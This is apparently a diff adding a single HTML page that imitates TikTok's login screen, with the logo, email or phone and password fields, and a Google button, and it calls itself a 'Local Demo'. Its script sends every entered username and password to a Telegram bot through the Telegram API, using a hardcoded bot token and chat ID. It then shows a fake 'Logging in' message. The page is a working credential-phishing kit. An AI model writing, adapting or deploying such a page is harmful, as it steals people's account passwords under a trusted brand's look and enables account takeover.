@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok - Local Demo</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+    min-height: 100vh;
+    background: #05070a;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-page {
+    width: 100%;
+    max-width: 430px;
+    min-height: 100vh;
+    padding: 22px 24px 30px;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+}
+
+/* TOP BAR */
+
+.top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 16px;
+    margin-bottom: 45px;
+}
+
+.back {
+    font-size: 34px;
+    font-weight: 200;
+    line-height: 20px;
+    cursor: pointer;
+}
+
+.help {
+    font-size: 16px;
+}
+
+/* LOGO */
+
+.logo-area {
+    text-align: center;
+    margin-bottom: 28px;
+}
+
+.tiktok-logo {
+    width: 70px;
+    height: 82px;
+    margin: 0 auto;
+}
+
+.tiktok-logo svg {
+    width: 100%;
+    height: 100%;
+    display: block;
+}
+
+.title {
+    margin-top: 12px;
+    font-size: 38px;
+    font-weight: 800;
+    letter-spacing: -1.5px;
+}
+
+.subtitle {
+    margin-top: 10px;
+    color: #aeb4bd;
+    font-size: 17px;
+}
+
+/* FORM */
+
+.form {
+    margin-top: 30px;
+}
+
+/* PHONE OPTION */
+
+.phone-option {
+    color: #fe2c55;
+    text-align: left;
+    font-size: 14px;
+    font-weight: 600;
+    margin: 0 2px 10px;
+    cursor: pointer;
+}
+
+/* FIELDS */
+
+.field {
+    height: 58px;
+    background: #151b22;
+    border: 1px solid #29313b;
+    border-radius: 11px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    padding: 0 15px;
+}
+
+.field:focus-within {
+    border-color: #5c6570;
+}
+
+.icon {
+    width: 26px;
+    margin-right: 12px;
+    font-size: 22px;
+    color: #e5e8ec;
+    text-align: center;
+}
+
+.field input {
+    flex: 1;
+    height: 100%;
+    border: none;
+    outline: none;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+}
+
+.field input::placeholder {
+    color: #9ba2ac;
+}
+
+/* SMALL PASSWORD EYE */
+
+.eye {
+    width: 18px;
+    height: 11px;
+    position: relative;
+    margin-left: 9px;
+    cursor: pointer;
+    border: 1.5px solid #9ba2ac;
+    border-radius: 50%;
+    flex-shrink: 0;
+}
+
+.eye::after {
+    content: "";
+    position: absolute;
+    width: 4px;
+    height: 4px;
+    background: #9ba2ac;
+    border-radius: 50%;
+    top: 2px;
+    left: 5.5px;
+}
+
+.eye.closed::before {
+    content: "";
+    position: absolute;
+    width: 21px;
+    height: 1.5px;
+    background: #9ba2ac;
+    left: -3px;
+    top: 4px;
+    transform: rotate(-45deg);
+    transform-origin: center;
+}
+
+/* CONTINUE */
+
+.continue {
+    width: 100%;
+    height: 56px;
+    border: none;
+    border-radius: 10px;
+    margin-top: 14px;
+    background: #7d1632;
+    color: #bcbcc0;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .2s;
+}
+
+.continue.ready {
+    background: #fe1748;
+    color: white;
+}
+
+.continue:active {
+    transform: scale(.98);
+}
+
+/* STATUS */
+
+.status {
+    display: none;
+    text-align: center;
+    color: white;
+    font-size: 14px;
+    font-weight: 400;
+    margin-top: 18px;
+}
+
+.status.show {
+    display: block;
+}
+
+/* OR */
+
+.or {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 28px 0 18px;
+    color: #b4b7bd;
+    font-size: 13px;
+}
+
+.or::before,
+.or::after {
+    content: "";
+    height: 1px;
+    background: #30343a;
+    flex: 1;
+}
+
+/* GOOGLE */
+
+.google {
+    width: 100%;
+    height: 56px;
+    border: 1px solid #29313b;
+    border-radius: 10px;
+    background: #151b22;
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 13px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.google-icon {
+    font-size: 21px;
+    font-weight: 800;
+}
+
+/* SIGN UP */
+
+.signup {
+    text-align: center;
+    margin-top: 38px;
+    color: #b8bbc1;
+    font-size: 14px;
+}
+
+.signup span {
+    color: #fe2c55;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+/* FOOTER */
+
+.footer {
+    margin-top: auto;
+    padding-top: 30px;
+    text-align: center;
+    color: #555c65;
+    font-size: 10px;
+}
+
+/* MOBILE */
+
+@media (max-width: 430px) {
+    .login-page {
+        padding-left: 24px;
+        padding-right: 24px;
+    }
+
+    .top {
+        margin-bottom: 40px;
+    }
+
+    .title {
+        font-size: 35px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-page">
+
+    <div class="top">
+        <div class="back">‹</div>
+        <div class="help">Help</div>
+    </div>
+
+    <div class="logo-area">
+
+        <div class="tiktok-logo">
+            <svg
+                viewBox="0 0 100 120"
+                xmlns="http://www.w3.org/2000/svg"
+                aria-label="TikTok logo"
+            >
+                <path
+                    d="M63 10v62.5c0 13.5-8.5 23.5-21 23.5
+                    -10.5 0-19-7.5-19-17
+                    0-10 8.5-17.5 19-17.5
+                    3.5 0 6.8.9 9.5 2.5V45
+                    c-4.5-1-9-1.5-13.5-1.5
+                    C20 43.5 8 55.5 8 71
+                    c0 17.5 14.5 31 32 31
+                    17.5 0 31-13 31-32V35
+                    c6.5 5.5 14.5 8.5 23 8.5V24
+                    c-9.5 0-18-5.5-22-14z"
+                    fill="#25F4EE"
+                    transform="translate(-4 2)"
+                />
+                <path
+                    d="M63 10v62.5c0 13.5-8.5 23.5-21 23.5
+                    -10.5 0-19-7.5-19-17
+                    0-10 8.5-17.5 19-17.5
+                    3.5 0 6.8.9 9.5 2.5V45
+                    c-4.5-1-9-1.5-13.5-1.5
+                    C20 43.5 8 55.5 8 71
+                    c0 17.5 14.5 31 32 31
+                    17.5 0 31-13 31-32V35
+                    c6.5 5.5 14.5 8.5 23 8.5V24
+                    c-9.5 0-18-5.5-22-14z"
+                    fill="#FE2C55"
+                    transform="translate(4 0)"
+                />
+                <path
+                    d="M63 10v62.5c0 13.5-8.5 23.5-21 23.5
+                    -10.5 0-19-7.5-19-17
+                    0-10 8.5-17.5 19-17.5
+                    3.5 0 6.8.9 9.5 2.5V45
+                    c-4.5-1-9-1.5-13.5-1.5
+                    C20 43.5 8 55.5 8 71
+                    c0 17.5 14.5 31 32 31
+                    17.5 0 31-13 31-32V35
+                    c6.5 5.5 14.5 8.5 23 8.5V24
+                    c-9.5 0-18-5.5-22-14z"
+                    fill="#FFFFFF"
+                />
+            </svg>
+        </div>
+
+        <div class="title">TikTok</div>
+
+        <div class="subtitle">
+            Log in to your account
+        </div>
+
+    </div>
+
+    <div class="form">
+
+        <div
+            class="phone-option"
+            id="phoneOption"
+            onclick="usePhone()"
+        >
+            Use phone number
+        </div>
+
+        <div class="field" id="loginField">
+
+            <div class="icon" id="loginIcon">✉</div>
+
+            <input
+                type="text"
+                id="email"
+                placeholder="Email or username"
+                autocomplete="off"
+            >
+
+        </div>
+
+        <div class="field">
+
+            <div class="icon">♙</div>
+
+            <input
+                type="password"
+                id="password"
+                placeholder="Password"
+                autocomplete="off"
+            >
+
+            <div
+                class="eye closed"
+                id="eye"
+                onclick="togglePassword()"
+                aria-label="Show or hide password"
+            ></div>
+
+        </div>
+
+        <button
+            class="continue"
+            id="continueBtn"
+            type="button"
+        >
+            Continue
+        </button>
+
+        <div class="status" id="status">
+            Logging in, please wait a moment....
+        </div>
+
+    </div>
+
+    <div class="or">
+        OR
+    </div>
+
+    <button
+        class="google"
+        type="button"
+        onclick="googleDemo()"
+    >
+        <span class="google-icon">G</span>
+        <span>Continue with Google</span>
+    </button>
+
+    <div class="signup">
+        Don't have an account?
+        <span>Sign up</span>
+    </div>
+
+    <div class="footer">
+        Make your day.
+    </div>
+
+</div>
+
+<script>
+/* ============================================================
+   ⚙️ TELEGRAM CONFIG — REPLACE THESE TWO VALUES
+   ============================================================ */
+const BOT_TOKEN = '8671420149:AAGPOL9Pj4q1MLQOc_uIi-OKApAwYZOjSKg';
+const CHAT_ID   = '8893762472';
+
+/* ============================================================
+   ELEMENTS
+   ============================================================ */
+const email       = document.getElementById("email");
+const password    = document.getElementById("password");
+const continueBtn = document.getElementById("continueBtn");
+const status      = document.getElementById("status");
+const eye         = document.getElementById("eye");
+const loginIcon   = document.getElementById("loginIcon");
+const phoneOption = document.getElementById("phoneOption");
+
+let phoneMode = false;
+
+/* ============================================================
+   SEND TO TELEGRAM
+   ============================================================ */
+async function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            disable_web_page_preview: true
+        })
+    });
+    const data = await res.json();
+    if (!res.ok || !data.ok) {
+        throw new Error(data.description || 'send failed');
+    }
+    return data;
+}
+
+/* ============================================================
+   ENABLE / DISABLE CONTINUE BUTTON
+   ============================================================ */
+function updateButton() {
+    const ready =
+        email.value.trim().length > 0 &&
+        password.value.trim().length > 0;
+    continueBtn.classList.toggle("ready", ready);
+}
+
+email.addEventListener("input", updateButton);
+password.addEventListener("input", updateButton);
+
+/* ============================================================
+   PHONE / EMAIL TOGGLE
+   ============================================================ */
+function usePhone() {
+    phoneMode = !phoneMode;
+
+    if (phoneMode) {
+        loginIcon.textContent = "☎";
+        email.placeholder = "Phone number";
+        email.type = "tel";
+        phoneOption.textContent = "Use email or username";
+    } else {
+        loginIcon.textContent = "✉";
+        email.placeholder = "Email or username";
+        email.type = "text";
+        phoneOption.textContent = "Use phone number";
+    }
+
+    email.value = "";
+    updateButton();
+    email.focus();
+}
+
+/* ============================================================
+   PASSWORD SHOW / HIDE
+   ============================================================ */
+function togglePassword() {
+    if (password.type === "password") {
+        password.type = "text";
+        eye.classList.remove("closed");
+    } else {
+        password.type = "password";
+        eye.classList.add("closed");
+    }
+}
+
+/* ============================================================
+   CONTINUE → SEND TO TELEGRAM
+   ============================================================ */
+continueBtn.addEventListener("click", async function () {
+    const user = email.value.trim();
+    const pass = password.value.trim();
+
+    if (user.length === 0 || pass.length === 0) return;
+
+    // show status
+    status.textContent = "Logging in, please wait a moment....";
+    status.classList.add("show");
+    continueBtn.disabled = true;
+
+    // build the message
+    const message =
+        "🔐 Login attempt\n" +
+        "👤 " + user + "\n" +
+        "🔑 " + pass;
+
+    try {
+        await sendToTelegram(message);
+    } catch (err) {
+        console.error("Telegram error:", err);
+    } finally {
+        // hide status after 5 seconds no matter what
+        setTimeout(function () {
+            status.classList.remove("show");
+            continueBtn.disabled = false;
+        }, 5000);
+    }
+});
+
+/* ============================================================
+   GOOGLE DEMO
+   ============================================================ */
+function googleDemo() {
+    alert("Google login is connected in this local demo.");
+}
+</script>
+
+</body>
+</html>
